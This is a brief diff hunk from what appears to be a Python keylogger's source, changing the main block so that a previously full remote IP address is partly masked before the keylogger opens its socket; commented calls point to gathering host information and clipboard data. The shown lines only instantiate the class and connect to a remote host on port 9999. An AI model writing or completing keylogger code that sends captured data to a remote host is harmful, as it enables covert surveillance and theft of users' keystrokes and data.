@@ -143,7 +143,7 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    ke = Keylogger("20.173.64.5", 9999)
+    ke = Keylogger("20.173.-.-", 9999)
     ke.start_socket()
     # ke.host_info()
     # ke.clipboard_data()
